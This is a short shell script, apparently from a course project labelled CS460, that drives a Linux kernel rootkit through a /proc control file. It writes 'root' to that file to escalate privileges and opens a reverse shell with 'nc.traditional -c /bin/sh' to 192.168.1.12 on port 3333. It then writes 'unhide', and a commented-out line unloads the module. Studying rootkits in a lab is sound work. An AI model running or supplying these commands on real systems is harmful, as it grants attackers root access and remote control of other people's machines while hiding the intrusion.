#/bin/sh


echo "root" > /proc/CS460/status
/bin/nc.traditional -c /bin/sh 192.168.1.12 3333

echo "unhide" > /proc/CS460/status
#rmmod rootkit
